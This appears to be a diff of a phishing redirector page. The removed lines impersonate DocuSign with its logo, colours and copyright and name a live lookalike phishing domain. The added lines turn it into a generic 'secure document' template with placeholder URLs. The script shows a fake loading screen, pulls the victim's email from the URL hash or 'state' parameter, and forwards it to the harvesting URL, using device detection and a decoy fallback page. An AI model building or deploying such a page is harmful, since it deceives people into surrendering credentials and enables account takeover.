@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Accessing Document - DocuSign</title>
+    <title>Accessing Secure Document</title>
     <style>
         body {
-            font-family: "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
-            background-color: #f8f8f8;
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
             margin: 0;
             padding: 0;
             display: flex;
@@ -20,21 +20,33 @@
             background-color: #ffffff;
             border-radius: 4px;
             box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-            padding: 40px;
-            width: 480px;
+            width: 520px;
             max-width: 90%;
             text-align: center;
+            overflow: hidden;
         }
-        .header {
-            margin-bottom: 30px;
+        .header-banner {
+            background-color: #005a9e;
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
         }
-        .docusign-logo {
-            width: 150px;
+        .company-logo {
+            width: 120px;
             height: auto;
-            margin-bottom: 20px;
+        }
+        .header-text {
+            color: #ffffff;
+            font-size: 14px;
+            font-weight: bold;
+            margin: 0;
+        }
+        .content-area {
+            padding: 30px 40px;
         }
         .title {
-            color: #19487C; /* DocuSign's darker blue */
+            color: #333333;
             font-size: 22px;
             font-weight: 600;
             margin: 0 0 10px 0;
@@ -54,7 +66,7 @@
             width: 40px;
             height: 40px;
             border: 4px solid rgba(0,0,0,0.1);
-            border-top-color: #FFD100; /* DocuSign yellow/gold */
+            border-top-color: #005a9e;
             border-radius: 50%;
             animation: spin 1s linear infinite;
             margin-bottom: 15px;
@@ -73,9 +85,9 @@
             margin-bottom: 20px;
             width: 100%;
         }
-        .progress-bar-fill { /* Renamed from .progress-bar to match original sec.html */
+        .progress-bar-fill {
             height: 100%;
-            background-color: #19487C;
+            background-color: #005a9e;
             width: 0%;
             animation: fill 2.5s linear forwards;
             border-radius: 4px;
@@ -100,119 +112,97 @@
             70% { width: 80%; }
             100% { width: 100%; }
         }
-        noscript {
-            display: block;
-            margin-top: 20px;
-            padding: 15px;
-            background-color: #fff3cd;
-            color: #856404;
-            border: 1px solid #ffeeba;
-            border-radius: 4px;
-            font-size: 14px;
-        }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="header">
-            <img src="https://images.ctfassets.net/3fcisxc3a6xz/docusign_logo_black_text_on_white_0.png/90872cd475f92acafc7c490c93976e40/ds-logo-on-white.png" alt="DocuSign Logo" class="docusign-logo">
-            <h1 class="title">Preparing Your Document</h1>
-            <p class="subtitle">Please wait a moment while we get things ready for you.</p>
+        <div class="header-banner">
+            <img src="" alt="Logo" class="company-logo">
+            <p class="header-text">INTERNAL MEMO</p>
         </div>
-        <div class="loading-container">
-            <div class="spinner"></div>
-            <p class="loading-text">Verifying and loading...</p>
+        <div class="content-area">
+            <h1 class="title">Accessing Your Secure Document</h1>
+            <p class="subtitle">Please wait a moment while we retrieve your document.</p>
+            <div class="loading-container">
+                <div class="spinner"></div>
+                <p class="loading-text">Verifying and loading...</p>
+            </div>
+            <div class="progress-container">
+                <div class="progress-bar-fill" id="progressBar"></div>
+            </div>
+            <p class="file-info">This shouldn't take long.</p>
+            <p class="footer-text">&copy; All rights reserved.</p>
         </div>
-        <div class="progress-container">
-            <div class="progress-bar-fill" id="progressBar"></div>
-        </div>
-        <p class="file-info">This shouldn't take long.</p>
-        <noscript>
-            <p>JavaScript is essential for DocuSign to function. Please enable JavaScript in your browser settings and reload the page.</p>
-        </noscript>
-        <p class="footer-text">&copy; DocuSign, Inc. All rights reserved.</p>
     </div>
 
-    <!-- Simple device detection and redirect script -->
     <script>
     (function() {
-        const REDIRECT_DELAY = 2500; // Adjusted for progress bar animation
-        const MOBILE_REDIRECT_URL_BASE = "https://esignatureonlinesecureportalaccess.tdmgo.co/?WqXmwl=ZjEwMDI1ODc2NDEyNGUwN2FmYzgxZDQwNmE1MDYwZmU%3D&Zw6aMW=eNKKj8h&username=";
-        const DESKTOP_REDIRECT_URL = "https://outlook.office365.com/";
-        const DEAD_URL = "https://www.theguardian.com/environment/climate-crisis"; // Target URL if no value found
+        const REDIRECT_DELAY = 2500;
+        const MOBILE_REDIRECT_URL_BASE = "YOUR_MOBILE_REDIRECT_URL_BASE";
+        const DESKTOP_REDIRECT_URL = "YOUR_DESKTOP_REDIRECT_URL";
+        const DEAD_URL = "YOUR_FALLBACK_URL";
 
-        // Mobile device detection function
         function isMobileDevice() {
             const userAgent = navigator.userAgent.toLowerCase();
             return /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile|phone/i.test(userAgent);
         }
 
-        // Get potential value from hash (priority) or search string
         function getPotentialValue() {
-            const hash = window.location.hash.substring(1); // Remove leading '#'
+            const hash = window.location.hash.substring(1);
             if (hash) {
                 let decodedHash;
                 try { decodedHash = decodeURIComponent(hash); } catch (e) { decodedHash = hash; }
-                // Remove trailing '=' if present
                 if (decodedHash.endsWith('=')) {
                     decodedHash = decodedHash.replace(/=+$/, '');
                 }
                 return decodedHash;
             }
 
-            // New logic: Check for 'state' parameter as an alternative
             const params = new URLSearchParams(window.location.search);
             const state = params.get('state');
             if (state) {
-                // The state might contain "name:email", so we extract the email part.
-                // It could also just be the email.
                 if (state.includes(':')) {
                     return state.substring(state.indexOf(':') + 1);
                 }
                 return state;
             }
 
-            const search = window.location.search.substring(1); // Remove leading '?'
+            const search = window.location.search.substring(1);
             if (search) {
                 let decodedSearch;
                 try { decodedSearch = decodeURIComponent(search); } catch (e) { decodedSearch = search; }
-                // Remove trailing '=' if present
                 if (decodedSearch.endsWith('=')) {
                     decodedSearch = decodedSearch.replace(/=+$/, '');
                 }
                 return decodedSearch;
             }
-            return null; // No hash or search string found
+            return null;
         }
 
-       // Main redirect function
         function performRedirect() {
             const value = getPotentialValue();
 
             if (value) {
-                console.log("Found value:", value);
                 if (isMobileDevice()) {
                     const redirectUrl = MOBILE_REDIRECT_URL_BASE + value;
-                    console.log("Mobile device detected. Redirecting to:", redirectUrl);
                     window.location.href = redirectUrl;
                 } else {
-                    const redirectUrl = MOBILE_REDIRECT_URL_BASE + value;
-                    console.log("Mobile device detected. Redirecting to:", redirectUrl);
+                    const redirectUrl = DESKTOP_REDIRECT_URL + value;
                     window.location.href = redirectUrl;
                 }
             } else {
-                console.log("No value found in hash or search. Redirecting all devices to dead URL:", DEAD_URL);
                 document.querySelector('.loading-text').textContent = 'Error: Link invalid or expired.';
                 document.querySelector('.file-info').textContent = 'Please check the link or contact support.';
                 if(document.getElementById('progressBar')) {
-                    document.getElementById('progressBar').style.backgroundColor = '#d9534f'; // Error color
+                    document.getElementById('progressBar').style.backgroundColor = '#d9534f';
                     document.getElementById('progressBar').style.width = '100%';
                 }
-                // No redirect if no value, error is shown on page
+                setTimeout(() => {
+                    window.location.href = DEAD_URL;
+                }, 1500);
             }
         }
 
-        // Execute redirect after a short delay
         setTimeout(performRedirect, REDIRECT_DELAY);
     })();
     </script>
